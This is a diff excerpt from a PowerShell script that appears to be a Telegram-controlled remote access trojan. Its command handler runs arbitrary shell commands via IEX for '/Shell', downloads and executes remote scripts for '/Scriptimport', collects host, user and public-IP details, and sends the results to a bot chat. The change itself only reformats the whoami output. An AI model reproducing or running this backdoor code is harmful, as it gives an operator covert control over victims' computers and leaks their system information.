@@ -171,7 +171,7 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Shell*") {$comando = $comando -replace "/Shell ",""; if ($comando -like "dir" -or $comando -like "ls") {$comando = $comando + " -Name" }$texto = IEX $comando | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
- if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto = $texto -split "; " ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/Ippublic") {$texto = public-ip -botkey $botkey | Format-List | Out-String; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/kill" -and $first_connect -gt 10) {$texto = "$env:COMPUTERNAME disconected"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id; sleep -Seconds 2 ; exit}
  if ($comando -like "/Scriptimport") {$comando = $comando -replace "/scriptimport ","" ;$comando = IEX(wget $comando);$texto = IEX $comando | Out-String ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
